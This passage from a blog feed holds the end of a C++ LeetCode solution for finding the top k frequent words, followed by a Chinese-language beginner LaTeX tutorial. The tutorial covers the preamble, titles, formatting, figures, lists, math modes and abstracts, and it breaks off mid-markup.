class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">topKFrequent</span><span class="hljs-params">(vector&lt;string&gt;&amp; words, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        unordered_map&lt;string, <span class="hljs-type">int</span>&gt; mp;<br>        <span class="hljs-keyword">for</span> (string word : words) &#123;<br>            mp[word]++;<br>        &#125;<br><br>        vector&lt;string&gt; ans;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> [key, value] : mp) &#123;<br>            ans.<span class="hljs-built_in">emplace_back</span>(key);<br>        &#125;<br><br>        <span class="hljs-built_in">sort</span>(ans.<span class="hljs-built_in">begin</span>(), ans.<span class="hljs-built_in">end</span>(),<br>             [&amp;](<span class="hljs-type">const</span> string&amp; a, <span class="hljs-type">const</span> string&amp; b) -&gt; <span class="hljs-type">bool</span> &#123;<br>                 <span class="hljs-keyword">return</span> mp[a] == mp[b] ? a &lt; b : mp[a] &gt; mp[b];<br>             &#125;);<br><br>        ans.<span class="hljs-built_in">erase</span>(ans.<span class="hljs-built_in">begin</span>() + k, ans.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LaTex</title>
    <link href="/2024/03/30/%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/LaTeX/"/>
    <url>/2024/03/30/%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/LaTeX/</url>
    
    <content type="html"><![CDATA[<h1 id="简介">0. 简介</h1><p>LaTeX是一种用于<strong>排版专业文档</strong>的工具。</p><h2 id="工作方式">0.1 工作方式</h2><p>你的文档是一个纯文本文件，其中穿插了用于表达所需（排版）结果的 LaTeX命令。为了生成可见的排版文档，您的 LaTeX 文件将由一个名为 TeX引擎的软件处理，该软件使用嵌入在文本文件中的命令来指导和控制排版过程，将LaTeX 命令和文档文本转换为专业排版的 PDF文件。这意味着您只需专注于文档内容，计算机将通过 LaTeX 命令和 TeX引擎处理视觉外观（格式）。</p><h2 id="功能">0.2 功能</h2><ul><li>文档内容与文档样式分离；</li><li>支持排版极其复杂的数学、表格和物理科学的技术内容；</li><li>脚注、交叉引用和书目管理功能；</li><li>易于制作复杂或乏味的文档元素，如索引、词汇表、目录和数字列表；</li><li>由于其固有的可编程性和可扩展性，可通过数千个免费的附加软件包高度定制定制文档制作。</li></ul><h2 id="示例">0.3 示例</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748187.png"alt="image-20240330161053726" /><figcaption aria-hidden="true">image-20240330161053726</figcaption></figure><ul><li>代码的第一行<code>\documentclass&#123;article&#125;</code>声明了<strong>文档类型</strong>，称为<em>类(class)</em>。类控制文档的整体外观，不同类型的文档需要选择不同的类，比如，简历与论文需要不同的类。在这个例子中，类是<code>article</code>，是最简单和最常见的 LATEX类。其他类型的文档可能需要使用不同的类，例如 <strong>book</strong> 或<strong>report</strong>。</li><li><code>\begin &#123;document&#125;</code> 和 <code>\end &#123;document&#125;</code>这两个标记之间是<strong>文档内容</strong>。这部分就是文档的 <em>主体(body)</em>，你可以在此处开始编写和更改文本。要在 PDF中查看更改的结果，必须首先编译文档。在 Overleaf 中只需单击<strong>重新编译（Recompile）</strong>。还可以单击重新编译按钮旁边的小箭头，并将“自动编译” 设置为 “开”，这样编辑文件时项目将会自动重新编译。</li></ul><h1 id="文档的序言">1. 文档的序言</h1><p>在上一个示例中，文本是在 <code>\begin &#123;document&#125;</code>命令之后输入的。在这个命令之前 <code>.tex</code> 文件中的所有内容都称为<strong>序言(preamble)</strong>。在序言中，可以定义要编写的文档的类型，要编写的语言，要使用的包（稍后会详细介绍）和其他的元素。例如，普通文档的序言如下所示：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\documentclass</span>[12pt, letterpaper]&#123;article&#125;<br><span class="hljs-keyword">\usepackage</span>[utf8]&#123;inputenc&#125;<br></code></pre></td></tr></table></figure><p>下面我们详细解释一下这两行的作用：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\documentclass</span>[12pt, letterpaper]&#123;article&#125;<br></code></pre></td></tr></table></figure><p>这条命令定义了文档的类型。跟上个示例不一样的是，方括号中还有两个参数，这些参数必须用<strong>逗号分隔</strong>。在这个示例中，这两个额外的参数分别设置字体大小（<code>12pt</code>）和纸张大小（<code>letterpaper</code>）。当然，可以使用其他字体大小（<code>9pt</code>，<code>11pt</code>，<code>12pt</code>等等），但是如果未指定，则默认的字体大小为<code>10pt</code>。纸张尺寸还可以设置为 <code>a4paper</code> 和<code>Legalpaper</code>；更多有关 <ahref="https://link.zhihu.com/?target=https%3A//www.overleaf.com/learn/Page_size_and_margins">页面大小和边距</a>的信息，可以参阅这篇文章。</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\usepackage</span>[utf8]&#123;inputenc&#125;<br></code></pre></td></tr></table></figure><p>这行命令指定了文档的编码，可以省略或更改为其他编码，但建议使用<code>utf-8</code>。除非特别需要其他编码，否则请将此行添加到序言中。</p><h1 id="添加标题作者和日期">2. 添加标题、作者和日期</h1><p>要将标题、作者和日期添加到文档中，就必须<strong>在序言中</strong>（不是文章的主体中）添加下面三行。它们是：</p><p><code>\title&#123;First document&#125;</code> 这是文章的标题。</p><p><code>\author&#123;Hubert Farnsworth&#125;</code> 在此处输入作者的姓名。</p><p><code>\thanks&#123;funded by the Overleaf team&#125;</code> 在<code>author</code>命令的大括号里添加这条命令，可以添加上标和脚注。如果你需要在文章中感谢一个机构，这个功能将非常有用。</p><p><code>\date&#123;February 2014&#125;</code> 你可以手动输入日期，或使用<code>\today</code> 命令，以便在编译文档时自动更新日期。</p><p>现在，序言部分应该长这样：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\documentclass</span>[12pt, letterpaper, twoside]&#123;article&#125;<br><span class="hljs-keyword">\usepackage</span>[utf8]&#123;inputenc&#125;<br><br><span class="hljs-keyword">\title</span>&#123;First document&#125;<br><span class="hljs-keyword">\author</span>&#123;Hubert Farnsworth <span class="hljs-keyword">\thanks</span>&#123;funded by the Overleaf team&#125;&#125;<br><span class="hljs-keyword">\date</span>&#123;February 2017&#125;<br></code></pre></td></tr></table></figure><p>现在，你已经为文档指定了标题、作者和日期，现在可以使用<code>\maketitle</code> 命令在文档上打印这些信息。这条命令应该写在文档<strong>主体 (body)</strong> 中你想要打印标题的位置。</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\begin</span>&#123;document&#125;<br><br><span class="hljs-keyword">\maketitle</span><br><br>We have now added a title, author and date to our first <span class="hljs-keyword">\LaTeX</span>&#123;&#125; document!<br><br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748188.png"alt="image-20240330162922047" /><figcaption aria-hidden="true">image-20240330162922047</figcaption></figure><h1 id="添加注释">3. 添加注释</h1><p>与其他代码一样，注释是非常有用的。注释文本不会被打印，也不会以任何方式影响文档。在调试时，注释文本对于组织工作，做笔记或注释行/ 节很有用。要在 LATEX中添加注释，只需在行首写一个％符号，如下所示：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\begin</span>&#123;document&#125;<br><br><span class="hljs-keyword">\maketitle</span><br><br>We have now added a title, author and date to our first <span class="hljs-keyword">\LaTeX</span>&#123;&#125; document!<br><br><span class="hljs-comment">% This line here is a comment. It will not be printed in the document.</span><br><br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748189.png"alt="image-20240330162822347" /><figcaption aria-hidden="true">image-20240330162822347</figcaption></figure><h1 id="加粗斜体和下划线">4. 加粗、斜体和下划线</h1><p>现在让我们来看一些简单的格式化命令。</p><ul><li><strong>加粗</strong>：在 LATEX 中，加粗字体使用<code>\textbf&#123;&#125;</code> 命令。</li><li><em>斜体</em>：在 LATEX 中，斜体使用 <code>\textit&#123;&#125;</code>命令。</li><li>下划线：在 LATEX 中，下划线使用 <code>\underline&#123;&#125;</code>命令。</li></ul><p>下面是示例：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs latex">Some of the <span class="hljs-keyword">\textbf</span>&#123;greatest&#125;<br>discoveries in <span class="hljs-keyword">\underline</span>&#123;science&#125;<br>were made by <span class="hljs-keyword">\textbf</span>&#123;<span class="hljs-keyword">\textit</span>&#123;accident&#125;&#125;.<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748190.png"alt="image-20240330163104426" /><figcaption aria-hidden="true">image-20240330163104426</figcaption></figure><p>另一个非常有用的命令是 <code>\emph&#123;...&#125;</code> 命令。<code>\emph</code>是强调文本命令，她完成的操作取决于上下文：在普通文本中，强调的文本是斜体，但是如果在斜体文本中使用，则将文字变为普通文本，请参见以下示例：不过，有一些包（例如<ahref="https://link.zhihu.com/?target=https%3A//www.overleaf.com/learn/Beamer">Beamer</a>），会改变<code>\emph</code> 命令的作用。</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs latex">Some of the greatest <span class="hljs-keyword">\emph</span>&#123;discoveries&#125;<br>in science<br>were made by accident.<br><br><span class="hljs-keyword">\textit</span>&#123;Some of the greatest <span class="hljs-keyword">\emph</span>&#123;discoveries&#125;<br>in science<br>were made by accident.&#125;<br><br><span class="hljs-keyword">\textbf</span>&#123;Some of the greatest <span class="hljs-keyword">\emph</span>&#123;discoveries&#125;<br>in science<br>were made by accident.&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748191.png"alt="image-20240330163308668" /><figcaption aria-hidden="true">image-20240330163308668</figcaption></figure><h1 id="添加图片">5. 添加图片</h1><p>现在我们来看，如何向 LATEX 文档添加图片。在 Overleaf中，你需要首先上传图片。下面是一个如何添加图片的示例：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\documentclass</span>&#123;article&#125;<br><span class="hljs-keyword">\usepackage</span>&#123;graphicx&#125;<br><span class="hljs-keyword">\graphicspath</span>&#123;&#123;images/&#125; &#125;<br><br><span class="hljs-keyword">\begin</span>&#123;document&#125;<br>The universe is immense and it seems to be homogeneous,<br>in a large scale, everywhere we look at.<br><br><span class="hljs-keyword">\includegraphics</span>&#123;universe&#125;<br><br>There&#x27;s a picture of a galaxy above<br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748192.png"alt="image-20240330163733909" /><figcaption aria-hidden="true">image-20240330163733909</figcaption></figure><p>LATEX 本身不能管理图像，因此需要使用一个 <em>包(package)</em>。包可用于更改 LATEX文档的默认外观，或实现更多功能。在这个例子中，要实现在文档中添加图片，因此需要使用<code>graphicx</code> 包。<code>graphicx</code> 包提供了新的命令<code>\includegraphics&#123;...&#125;</code> 和<code>\graphicspath&#123;...&#125;</code>。要使用 <code>graphicx</code>软件包，要先在序言中添加：<code>\usepackage&#123;graphicx&#125;</code>。</p><p><code>\graphicspath&#123;...&#125;</code>告诉LATEX，这些图像保存在当前目录下名为 images 的文件夹中。<code>\includegraphics &#123;universe&#125;</code>命令是将图像实际包含在文档中的命令。在这里，universe是包含不带扩展名的图片文件的名称，图片文件名不应包含空格或多个点。</p><p>注意：LATEX允许包含文件扩展名，但是最好忽略它。如果省略文件扩展名，它将提示 LATEX搜索所有支持的格式。在上传图像文件时，通常也建议使用小写字母作为文件扩展名。有关更多详细信息，请参见有关<ahref="https://link.zhihu.com/?target=https%3A//www.overleaf.com/learn/latex/Learn_LaTeX_in_30_minutes%23Generating_high-res_and_low-res_images">生成高分辨率和低分辨率图像</a>的内容。</p><h1 id="标题标签和引用">6. 标题、标签和引用</h1><p>我们可以像下面这样，在 <code>figure</code>环境中对图片添加标题、标签和引用。</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\documentclass</span>&#123;article&#125;<br><span class="hljs-keyword">\usepackage</span>&#123;graphicx&#125;<br><span class="hljs-keyword">\graphicspath</span>&#123;&#123;images/&#125; &#125;<br> <br><span class="hljs-keyword">\begin</span>&#123;document&#125;<br><br><span class="hljs-keyword">\begin</span>&#123;figure&#125;[h]<br>    <span class="hljs-keyword">\centering</span><br>    <span class="hljs-keyword">\includegraphics</span>[width=0.75<span class="hljs-keyword">\textwidth</span>]&#123;mesh&#125;<br>    <span class="hljs-keyword">\caption</span>&#123;A nice plot.&#125;<br>    <span class="hljs-keyword">\label</span>&#123;fig:mesh1&#125;<br><span class="hljs-keyword">\end</span>&#123;figure&#125;<br> <br>As you can see in figure <span class="hljs-keyword">\ref</span>&#123;fig:mesh1&#125;, the function grows near the origin. This example is on page <span class="hljs-keyword">\pageref</span>&#123;fig:mesh1&#125;.<br><br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748193.png"alt="image-20240330164828162" /><figcaption aria-hidden="true">image-20240330164828162</figcaption></figure><p>示例中有几个值得注意的命令：</p><ul><li><code>\includegraphics[width=0.75/textwidth]&#123;mesh&#125;</code>：这个形式的<code>\includegraphics</code> 命令指示 LATEX 将图的宽度设置为文本宽度的75%--文本宽度的值存储在 <code>\textwidth</code> 。</li><li><code>\caption&#123;A nice plot.&#125;</code>：条命令用于设置图表标题，标题可以放在图表的上方或下方。如果你创建了一个图表列表，该标题将在列表中使用。</li><li><code>\label&#123;fig:mesh1&#125;</code>：如果你需要在文档中引用图像，请使用这条命令为图像设置标签。标签可以为图像编号，并与下一个命令结合，对图片进行引用。</li><li><code>\ref&#123;fig:mesh1&#125;</code>：这条命令在编译后将显示替换为被引用图片对应的编号。</li></ul><p>将图像放置在 LATEX 文档中时，应始终将它们放置在 <code>figure</code>环境或类似环境中，以便 LATEX 适配图像和文字。</p><h1 id="创建列表">7. 创建列表</h1><p>在 LATEX 中创建列表非常简单。你可以使用不同的 <em>环境(environment)</em> 来创建不同形式的列表。环境 (environment)是我们文档中具有不同呈现形式的各个部分。它们以 <code>\begin&#123;...&#125;</code>命令开始，以 <code>\end&#123;...&#125;</code> 命令结束。</p><p>列表主要有两种类型，有序列表和无序列表。分别使用不同的环境。</p><h2 id="无序列表">7.1 无序列表</h2><p>无序列表是由 <code>itemize</code> 环境生成的。每个条目之前必须有<code>\item</code>，如下所示。</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\begin</span>&#123;itemize&#125;<br>  <span class="hljs-keyword">\item</span> The individual entries are indicated with a black dot, a so-called bullet.<br>  <span class="hljs-keyword">\item</span> The text in the entries may be of any length.<br><span class="hljs-keyword">\end</span>&#123;itemize&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748195.png"alt="image-20240330165048930" /><figcaption aria-hidden="true">image-20240330165048930</figcaption></figure><h2 id="有序列表">7.2 有序列表</h2><p>有序列表在 <code>enumerate</code>环境中创建，与无序列表一样，每个条目前必须添加<code>\item</code>，它将自动生成标记该项目的数字，由从 1 开始。</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\begin</span>&#123;enumerate&#125;<br>  <span class="hljs-keyword">\item</span> This is the first entry in our list<br>  <span class="hljs-keyword">\item</span> The list numbers increase with each entry we add<br><span class="hljs-keyword">\end</span>&#123;enumerate&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748196.png"alt="image-20240330165215262" /><figcaption aria-hidden="true">image-20240330165215262</figcaption></figure><h1 id="添加数学表达式">8. 添加数学表达式</h1><p>LATEX 的主要优点之一是易于编写数学表达式。LATEX中有两种模式用于数学表达式： <strong>内联 (inline)</strong> 模式和<strong>显示 (display)</strong>模式。第一种模式（内联）编写的公式是文本中的一部分，第二种模式（显示）编写的公式不在段落中，而是放在单独的行上。</p><p>内联模式示例：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs latex">In physics, the mass-energy equivalence is stated<br>by the equation <span class="hljs-built_in">$</span>E=mc<span class="hljs-built_in">^</span>2<span class="hljs-built_in">$</span>, discovered in 1905 by Albert Einstein.<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748197.png"alt="image-20240330165425077" /><figcaption aria-hidden="true">image-20240330165425077</figcaption></figure><p>要在内联模式下添加数学表达式，可以使用以下定界符之一：<code>\(... \)</code>，<code>$ ... $</code>或<code>\begin&#123;math&#125; ... \end&#123;math&#125;</code>。它们作用相同，选择哪个完全取决于个人喜好。</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\documentclass</span>[12pt, letterpaper]&#123;article&#125;<br><span class="hljs-keyword">\begin</span>&#123;document&#125;<br><span class="hljs-keyword">\begin</span>&#123;math&#125;<br>E=mc<span class="hljs-built_in">^</span>2<br><span class="hljs-keyword">\end</span>&#123;math&#125; is typeset in a paragraph using inline math mode---as is <span class="hljs-built_in">$</span>E=mc<span class="hljs-built_in">^</span>2<span class="hljs-built_in">$</span>, and so too is <span class="hljs-keyword">\(</span>E=mc<span class="hljs-built_in">^</span>2<span class="hljs-keyword">\)</span>.<br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748198.png"alt="image-20240330165546495" /><figcaption aria-hidden="true">image-20240330165546495</figcaption></figure><p>显示模式有两种版本：编号和非编号。</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\documentclass</span>[12pt, letterpaper]&#123;article&#125;<br><span class="hljs-keyword">\begin</span>&#123;document&#125;<br>The mass-energy equivalence is described by the famous equation<br><span class="hljs-keyword">\[</span> E=mc<span class="hljs-built_in">^</span>2 <span class="hljs-keyword">\]</span> discovered in 1905 by Albert Einstein. <br><br>In natural units (<span class="hljs-built_in">$</span>c = 1<span class="hljs-built_in">$</span>), the formula expresses the identity<br><span class="hljs-keyword">\begin</span>&#123;equation&#125;<br>E=m<br><span class="hljs-keyword">\end</span>&#123;equation&#125;<br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748199.png"alt="image-20240330165957118" /><figcaption aria-hidden="true">image-20240330165957118</figcaption></figure><p>要在显示模式下打印方程式，可以使用以下定界符之一：<code>\[... \]</code>，<code>\begin&#123;displaymath&#125; ... \end&#123;displaymath&#125;</code>或 <code>\begin&#123;equation&#125; ... \end&#123;equation&#125;</code>。不推荐<code>$$ ... $$</code>，因为它会产生不一致的间距，而且可能不适用于某些数学软件包。</p><p>以下示例演示了使用 LaTeX 排版的一系列数学内容：</p><ul><li>上标和下标分别用 a_b 和 a^b；</li><li>使用 编写积分，使用 编写分数。极限使用上标和下标放置在积分上；</li><li>小写希腊字母像这样写：，大写希腊字母像这样写：</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748200.png"alt="image-20240330170259648" /><figcaption aria-hidden="true">image-20240330170259648</figcaption></figure><p>下一个示例使用了 <code>amsmath</code> 软件包提供的<code>equation*</code> 环境，因此我们需要将以下行添加到文档序言中：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\usepackage</span>&#123;amsmath&#125;<span class="hljs-comment">% For the equation* environment</span><br></code></pre></td></tr></table></figure><p>有关使用的更多信息，<code>amsmath</code>请参阅<ahref="https://cn.overleaf.com/learn/latex/Aligning_equations">帮助文章</a>。</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\documentclass</span>&#123;article&#125;<br><span class="hljs-keyword">\usepackage</span>&#123;amsmath&#125;<span class="hljs-comment">% For the equation* environment</span><br><span class="hljs-keyword">\begin</span>&#123;document&#125;<br><span class="hljs-keyword">\section</span>&#123;First example&#125;<br><br>The well-known Pythagorean theorem <span class="hljs-keyword">\(</span>x<span class="hljs-built_in">^</span>2 + y<span class="hljs-built_in">^</span>2 = z<span class="hljs-built_in">^</span>2<span class="hljs-keyword">\)</span> was proved to be invalid for other exponents, meaning the next equation has no integer solutions for <span class="hljs-keyword">\(</span>n&gt;2<span class="hljs-keyword">\)</span>:<br><br><span class="hljs-keyword">\[</span> x<span class="hljs-built_in">^</span>n + y<span class="hljs-built_in">^</span>n = z<span class="hljs-built_in">^</span>n <span class="hljs-keyword">\]</span><br><br><span class="hljs-keyword">\section</span>&#123;Second example&#125;<br><br>This is a simple math expression <span class="hljs-keyword">\(</span><span class="hljs-keyword">\sqrt</span>&#123;x<span class="hljs-built_in">^</span>2+1&#125;<span class="hljs-keyword">\)</span> inside text. <br>And this is also the same: <br><span class="hljs-keyword">\begin</span>&#123;math&#125;<br><span class="hljs-keyword">\sqrt</span>&#123;x<span class="hljs-built_in">^</span>2+1&#125;<br><span class="hljs-keyword">\end</span>&#123;math&#125;<br>but by using another command.<br><br>This is a simple math expression without numbering<br><span class="hljs-keyword">\[</span><span class="hljs-keyword">\sqrt</span>&#123;x<span class="hljs-built_in">^</span>2+1&#125;<span class="hljs-keyword">\]</span> <br>separated from text.<br><br>This is also the same:<br><span class="hljs-keyword">\begin</span>&#123;displaymath&#125;<br><span class="hljs-keyword">\sqrt</span>&#123;x<span class="hljs-built_in">^</span>2+1&#125;<br><span class="hljs-keyword">\end</span>&#123;displaymath&#125;<br><br><span class="hljs-keyword">\ldots</span> and this:<br><span class="hljs-keyword">\begin</span>&#123;equation*&#125;<br><span class="hljs-keyword">\sqrt</span>&#123;x<span class="hljs-built_in">^</span>2+1&#125;<br><span class="hljs-keyword">\end</span>&#123;equation*&#125;<br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748201.png"alt="image-20240330171146585" /><figcaption aria-hidden="true">image-20240330171146585</figcaption></figure><p>还有太多有关在 LATEX中书写数学表达式的知识无法在这里一一提及。可以查看下面这些文章：</p><ul><li><ahref="https://cn.overleaf.com/learn/latex/Mathematical_expressions">数学表达式</a></li><li><ahref="https://cn.overleaf.com/learn/latex/Subscripts_and_superscripts">下标和上标</a></li><li><ahref="https://cn.overleaf.com/learn/latex/Brackets_and_Parentheses">方括号和圆括号</a></li><li><ahref="https://cn.overleaf.com/learn/latex/Fractions_and_Binomials">分数和二项式</a></li><li><ahref="https://cn.overleaf.com/learn/latex/Aligning_equations_with_amsmath">对齐方程</a></li><li><ahref="https://cn.overleaf.com/learn/latex/Operators">运营商</a></li><li><ahref="https://cn.overleaf.com/learn/latex/Spacing_in_math_mode">数学模式下的间距</a></li><li><ahref="https://cn.overleaf.com/learn/latex/Integrals%2C_sums_and_limits">积分、总和和极限</a></li><li><ahref="https://cn.overleaf.com/learn/latex/Display_style_in_math_mode">数学模式下的显示样式</a></li><li><ahref="https://cn.overleaf.com/learn/latex/List_of_Greek_letters_and_math_symbols">希腊字母和数学符号列表</a></li><li><ahref="https://cn.overleaf.com/learn/latex/Mathematical_fonts">数学字体</a></li></ul><h1 id="基本文档结构">9. 基本文档结构</h1><h2 id="摘要">9.1 摘要</h2><p>科学文章通常提供<em>摘要</em>，即对其核心主题或论点的简要概述/总结。</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\documentclass</span>&#123;article&#125;<br><span class="hljs-keyword">\begin</span>&#123;document&#125;<br><span class="hljs-keyword">\begin</span>&#123;abstract&#125;<br>This is a simple paragraph at the beginning of the <br>document. A brief introduction about the main subject.<br><span class="hljs-keyword">\end</span>&#123;abstract&#125;<br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748202.png"alt="image-20240330171645519" /><figcaption aria-hidden="true">image-20240330171645519</figcaption></figure><h2 id="段落和新行">9.2 段落和新行</h2><ul><li>如果需要开始新段落，则必须按两次 “Enter”键（以插入双空行）。注意：LATEX 会自动缩进段落。</li><li>在开始新段落的情况下开始新行，需要插入一个 <em>换行点</em>，可以通过<code>\\</code>（在示例中为双反斜杠）或 <code>\newline</code>命令来完成。</li></ul><p>本示例中的第三段演示了命令<code>\\</code>和<code>\newline</code>：（<code>\verb|文字|</code>：原样输出其中的文本，忽视TeX命令。）</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span 